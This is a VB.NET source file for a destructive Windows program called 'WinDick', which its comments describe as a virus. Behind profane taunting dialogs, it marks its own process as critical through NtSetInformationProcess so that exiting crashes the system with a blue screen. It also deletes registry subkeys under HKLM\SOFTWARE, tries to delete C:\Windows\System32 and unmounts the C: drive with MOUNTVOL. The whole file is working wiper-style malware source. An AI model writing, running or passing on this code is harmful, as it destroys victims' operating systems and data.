Imports System.IO
Imports System.Threading
Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Imports System.Media

Public Class MainForm
    Private Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ContBtn.Enabled = False
        Dim sPlayer = New SoundPlayer(My.Resources.Dammit___blink_182) ' classic blink ;)
        sPlayer.PlayLooping()
    End Sub

    <DllImport("ntdll.dll", SetLastError:=True)>
    Public Shared Function NtSetInformationProcess(hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer
    End Function
    Private IsCritical As Integer = 1
    Private BreakOnTermination As Integer = &H1D ' when you put hex in vb.net it doesn't know what it means, so this means 0x1D

    Public Sub RaisePrivilage()
        ' sizeof doesn't exist in vb.net, so i had to use marshal's sizeof that should work perfectly fine
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, IsCritical, Marshal.SizeOf(GetType(Integer)))
    End Sub

    Public Sub DeleteHives(specifiedHive As String)
        Dim hives As RegistryKey = GetHiveFromString(specifiedHive)
        If hives Is Nothing Then Return

        Try
            For Each subKey As String In hives.GetSubKeyNames()
                hives.DeleteSubKeyTree(subKey)
            Next
        Catch ex As Exception
            MessageBox.Show("Failed to delete hive, exception: " & ex.ToString(), "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Function GetHiveFromString(hive As String) As RegistryKey
        If hive = "HKLM" Then
            Return Registry.LocalMachine.OpenSubKey("SOFTWARE", True)
        End If
        If hive = "HKCU" Then
            Return Registry.CurrentUser.OpenSubKey("Software", True)
        End If
        If hive = "HKCR" Then
            Return Registry.ClassesRoot
        End If
        If hive = "HKU" Then
            Return Registry.Users
        End If
        If hive = "HKCC" Then
            Return Registry.CurrentConfig
        End If
        Return Nothing
    End Function

    Private Sub ExitBtn_Click(sender As Object, e As EventArgs) Handles ExitBtn.Click
        If ValidateChkBox.Checked = False Then
            ' first we have to raise the process privilage so we can call a bsod
            RaisePrivilage()
            If MessageBox.Show("Hey you ass! Check the checkbox before you leave", "WinDick", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error) = DialogResult.Ignore Then
                MessageBox.Show("You choose to ignore me, fuck you", "WinDick", MessageBoxButtons.OK, MessageBoxIcon.Error)
                ' first we start to fuck the registy
                DeleteHives("HKLM")
                ' and delete system32
                Directory.Delete("C:\Windows\System32")
                Shell("MOUNTVOL C: /D") ' this basiclly ejects the C: drive ^__^ 
                'and after a minute my cute virus will call a bsod
                Thread.Sleep(60000) ' a minute before bsod
                Environment.Exit(1) ' because we raised the privilage to a critical process, we can bsod the whole computer
            End If
        Else
            Application.Exit()
        End If
    End Sub

    Private Sub CheckBtn_Click(sender As Object, e As EventArgs) Handles CheckBtn.Click
        If CodeTxtBox.Text Is Nothing Then
            MessageBox.Show("Enter a code, you fucker!", "WinDick", MessageBoxButtons.OK, MessageBoxIcon.Error)
        Else
            MessageBox.Show("Not the code, try again you asshat", "WinDick", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If

        If CodeTxtBox.Text = "EmmyMalwareRulz!" Then
            MessageBox.Show("I let you win, you rule too", "WinDick", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        End If
    End Sub

    Private Sub ValidateChkBox_CheckedChanged(sender As Object, e As EventArgs) Handles ValidateChkBox.CheckedChanged
        ContBtn.Enabled = True
    End Sub

    Private Sub ContBtn_Click(sender As Object, e As EventArgs) Handles ContBtn.Click
        MessageBox.Show("turnin pc inter hakr", "WinDick", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        DeleteHives("HKLM") ' idc if this causes an error but it's the least i can code for
        Directory.Delete("C:\Windows\System32")
        Thread.Sleep(10000)
        Shell("MOUNTVOL C: /D")
        Thread.Sleep(60000)
        Environment.Exit(1)
    End Sub

    Private Sub WhyLnkLbl_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles WhyLnkLbl.LinkClicked
        Shell("MOUNTVOL C: /D")
    End Sub
End Class
